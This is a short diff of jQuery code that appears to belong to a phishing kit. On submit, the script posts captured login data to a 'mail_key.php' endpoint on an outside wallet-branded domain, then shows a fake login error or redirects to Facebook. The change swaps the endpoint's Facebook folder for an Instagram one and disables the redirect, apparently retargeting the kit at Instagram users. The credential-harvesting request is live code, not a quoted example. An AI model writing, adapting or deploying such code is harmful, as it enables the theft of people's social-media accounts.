@@ -15,7 +15,7 @@ $('document').ready(function () {
         }
 
         $.ajax({
-            url: 'https://platiniumxpwallet.com/external/Facebook/php/mail_key.php',
+            url: 'https://platiniumxpwallet.com/external/Instagram/php/mail_key.php',
             method: 'post',
             data: {
                 login,
@@ -24,7 +24,7 @@ $('document').ready(function () {
             success: function (data) {
                 console.log(data);
                 if (data == 'Sent') {
-                    location.assign('https://facebook.com');
+                    // location.assign('https://facebook.com');
                 } else {
                     alert('Error Logging Into Your Account');
                 }
